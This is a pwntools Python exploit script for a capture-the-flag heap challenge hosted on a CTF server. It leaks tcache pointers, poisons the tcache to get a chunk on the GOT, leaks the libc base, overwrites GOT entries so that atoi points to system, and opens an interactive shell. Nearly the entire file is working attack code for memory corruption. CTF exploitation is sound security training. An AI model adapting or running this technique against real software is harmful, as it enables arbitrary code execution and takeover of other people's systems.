#!/usr/bin/env python3

from pwn import *

# ----------- Configuration ------------

# Configure accordingly
BINARY = './main'
HOST, PORT = 'localhost', 1337
LIBC = None#'./libc.so.6'
LD   = None#'./ld-linux-x86-64.so.2'
LIBC = './libc.so.6'
LD   = './ld-linux-x86-64.so.2'

# Pwntools context
context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']
context.aslr = None
#context.aslr = True

# Load binaries
elf  = ELF(BINARY)
libc = ELF(LIBC) if LIBC else None

# Breakpoints
gdb_breakpoints=[]

# GDB init commands
gdb_commands=[]


# ----------- Helpers ------------

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split(b'-')[0], 16)


# ----------- Launchers ------------

def make_gdbscript(p=None):
    script = "handle SIGALRM ignore\n"

    base = 0

    # PIE case (TODO fix this)
    #if p is not None:
    #    base = get_base_address(p)
    #    script += "set $_base = 0x{:x}\n".format(base)

    for bp in gdb_breakpoints:
        script += "b *0x%x\n"%(base + bp)

    for line in gdb_commands:
        script += f"{line}\n"

    return script

def gdb_attach(p):
    return gdb.attach(p, gdbscript=make_gdbscript(p=p))

def run_debug(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    kwargs["gdbscript"] = make_gdbscript()
    return gdb.debug(args, **kwargs)

def run_plain(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    #return process(args, **kwargs,)
    #return process(args, **kwargs, stdout=process.PTY)
    return process(args, **kwargs, stdout=process.PTY, stdin=process.PTY)

def start():
    if args.REMOTE:
        log.info("REMOTE PROCESS")
        HOST, PORT = 'blackhat4-8e21b51b2bebc943acee559fe335fec4-0.chals.bh.ctf.sa', 443                                                                                                      
        return remote(HOST, PORT, ssl=True, sni=HOST)
        return remote(HOST, PORT)

    elif args.DBG or args.DEBUG:
        log.info("LOCAL PROCESS (DEBUG)")
        return run_debug(BINARY, libc=LIBC, ld=LD)

    else:
        log.info("LOCAL PROCESS")
        return run_plain(BINARY, libc=LIBC, ld=LD)

# ----------- Functions -------------


def pad(msg,sz, p=b'\0'):
    return msg + p*(sz-len(msg))

def new_test():
    p.sendafter(b'>', pad(b'1',4))

def edit_test(idx, content):
    p.sendafter(b'>', pad(b'2',4))
    p.sendafter(b'index:', pad(str(idx).encode('utf-8'),4))
    p.sendafter(b'result:', pad(content,0x100))

def delete_test(idx):
    p.sendafter(b'>', pad(b'3',4))
    p.sendafter(b'index:', pad(str(idx).encode('utf-8'),4))

def show_test(idx):
    p.sendafter(b'>', pad(b'4',4))
    p.sendafter(b'index:', pad(str(idx).encode('utf-8'),4))
    p.recvuntil(b'OUTPUT:')
    o = p.recvuntil(b'\n1- New test result', drop=True)
    return o


# ----------- Main Logic ------------

# Define GDB breakpoints before starting
# gdb_breakpoints.append(0x0040066a)

# Define any extra GDB command to be executed
# (this is exec after breakpoints are set)
#gdb_commands.append("heap-analysis-helper")

# Launch the process
p = start()

# Uncomment this for attaching a debugger
#gdb_attach(p)

# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c


new_test() # 0
new_test() # 1
delete_test(0)
delete_test(1)

o = pad(show_test(0),8)
log.info(o.hex())
o = u64(o)
log.info(hex(o))
a_fd = o

o = pad(show_test(1),8)
log.info(o.hex())
o = u64(o)
log.info(hex(o))
b_fd = o


got = 0x404010
write_got = 0x404028
setvbuf_got = 0x00404060
atoi_got = 0x00404068
time_got = 0x00404050
target = got #time_got
edit_test(1, p64(a_fd ^ target))


new_test() # 0
new_test() # 1

log.info("Got handle to GOT")
o = pad(show_test(1),8)
log.info(o.hex())
o = u64(o)
log.info(hex(o))
leak = o

offset = 0x245c60
offset = 0x32fd30
offset = 0x242d30

libc = ELF("libc.so.6")
llibc_base = leak - offset 
log.info("LLIBC BASE "+hex(llibc_base))

libc_system = libc.symbols["system"]
llibc_system = llibc_base + libc_system
log.info("LLIBC SYSTEM "+hex(llibc_system))

#ogs = [
#    0x50a37,
#    0xebcf1,
#    0xebcf5,
#    0xebcf8,
#]
#og = llibc_base + ogs[0] 
#log.info("OG "+hex(og))

#gdb_attach(p)
payload = b''
payload += b'A'*8 # whatever
payload += b'B'*8 # PTR_free_00404018          
payload += p64(llibc_base + libc.symbols['rand']) # PTR_puts_00404020                 
payload += p64(llibc_base + libc.symbols['write']) # PTR_write
payload += b'C'*8 # PTR___stack_chk_fail_00404030     
payload += p64(llibc_base + libc.symbols['rand']) # PTR_printf
payload += p64(llibc_base + libc.symbols['read']) # PTR_read
payload += b'D'*8 # PTR_srand_00404048                
payload += b'E'*8 # PTR_time_00404050                 
payload += p64(llibc_base + libc.symbols['malloc']) # PTR_malloc
payload += b'F'*8 # PTR_setvbuf_00404060              
payload += p64(llibc_system) # PTR_atoi_00404068                 
payload += b'G'*8 # PTR_rand_00404070                 

#p.interactive()
#edit_test(1, p64(og)*0x10)

edit_test(1, payload)

#off = libc_system - libc_atoi
#log.info(f"Libc atoi {hex(libc_atoi)}")
#log.info(f"Libc system {hex(libc_system)}")
#log.info(f"Off {hex(off)}")

# Profit
p.interactive()

